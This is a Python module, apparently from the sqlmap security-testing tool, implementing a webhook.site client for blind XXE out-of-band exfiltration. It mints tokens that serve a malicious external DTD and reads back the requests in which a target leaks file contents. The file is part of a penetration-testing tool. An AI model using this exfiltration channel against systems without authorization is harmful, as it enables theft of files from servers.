#!/usr/bin/env python

"""
Copyright (c) 2006-2026 sqlmap developers (https://sqlmap.org)
See the file 'LICENSE' for copying permission
"""

import json

from lib.core.data import logger
from lib.core.convert import getText
from lib.core.enums import HTTP_HEADER
from lib.core.settings import OOB_EXFIL_ENDPOINT
from lib.request.connect import Connect as Request

# webhook.site is used for blind-XXE OOB *exfiltration*: it can both serve a custom
# response (our malicious external DTD) AND log the request the target then makes
# (carrying the file content). interactsh cannot host arbitrary content, hence the
# separate backend. HTTP-only, free tier, no account required for basic tokens.


class WebhookSite(object):
    """Thin webhook.site client: mints tokens (optionally serving fixed content)
    and reads back the requests captured on them. All calls go through sqlmap's
    request stack (proxy/timeout honoured) straight to the service, not the target."""

    def __init__(self):
        # Exfil host is the public content-serving endpoint (its token API is
        # service-specific, so --oob-server, which selects the interactsh *detection*
        # server, deliberately does not repoint it).
        self.endpoint = OOB_EXFIL_ENDPOINT.rstrip('/')

    def _api(self, path, post=None):
        try:
            headers = {HTTP_HEADER.CONTENT_TYPE: "application/json"} if post is not None else {HTTP_HEADER.ACCEPT: "application/json"}
            page, _, code = Request.getPage(url="%s%s" % (self.endpoint, path), post=post,
                                            auxHeaders=headers, direct=True, silent=True, raise404=False)
            return page if (code is None or code in (200, 201)) else None
        except Exception as ex:
            logger.debug("webhook.site request to '%s' failed: %s" % (path, getText(ex)))
            return None

    def newToken(self, content=None):
        """Create a token. When `content` is given the token serves it verbatim
        (used to host the external DTD). Returns the token UUID or None."""
        body = {"default_status": 200}
        if content is not None:
            body["default_content"] = content
            body["default_content_type"] = "application/xml"
        page = self._api("/token", post=json.dumps(body))
        if page:
            try:
                return json.loads(page).get("uuid")
            except ValueError:
                pass
        return None

    def hostUrl(self, token):
        """Target-facing URL for a token. Plain HTTP - XML parsers (libxml) commonly
        cannot fetch https external entities."""
        host = self.endpoint.split("://", 1)[-1]
        return "http://%s/%s" % (host, token)

    def captured(self, token):
        """Return the list of request records captured on `token` (newest first)."""
        page = self._api("/token/%s/requests?sorting=newest&per_page=50" % token)
        if page:
            try:
                return json.loads(page).get("data") or []
            except ValueError:
                pass
        return []
